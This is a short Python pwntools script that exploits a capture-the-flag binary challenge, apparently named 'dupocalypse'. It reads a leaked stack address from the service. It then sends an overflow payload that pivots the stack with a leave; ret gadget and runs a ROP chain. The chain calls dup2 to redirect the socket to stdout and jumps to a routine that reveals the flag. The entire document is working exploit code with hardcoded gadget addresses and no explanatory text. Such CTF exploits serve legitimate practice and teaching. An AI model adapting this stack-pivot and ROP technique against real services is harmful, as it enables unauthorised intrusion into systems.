from pwn import *

binary = './challenge/chal'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = remote('127.0.0.1', 1337)
# r = remote('dupocalypse.ctf.prgy.in', 1337, ssl=True)

r.recvuntil(b"The stack has spoken:")
leaked_stack = int(r.recvline().strip(), 16)
log.info(f"Leaked stack address: {hex(leaked_stack)}")

leave_ret = 0x400b39

pop_rdi = 0x400e93
pop_rsi_r15 = 0x400e91
pop_rdx = 0x400e92

payload = flat(
    leaked_stack,           # RBP
    pop_rdi,                # pop rdi; ret (Argument 1)
    4,                      # Socket fd
    pop_rsi_r15,            # pop rsi; pop r15; ret (Argument 2)
    1,                      # Because the flag is in the stdout
    0x0,
    p64(e.symbols['dup2']),

    pop_rdi,
    0x0,                    # useless
    pop_rsi_r15,
    0x0,                    # useless
    0x0,
    p64(0x400AC1)
)

payload = payload.ljust(256, b'A')
payload += flat([
    leaked_stack,
    leave_ret,
])

r.recvuntil(b"your input?\n")
r.send(payload)

r.interactive()
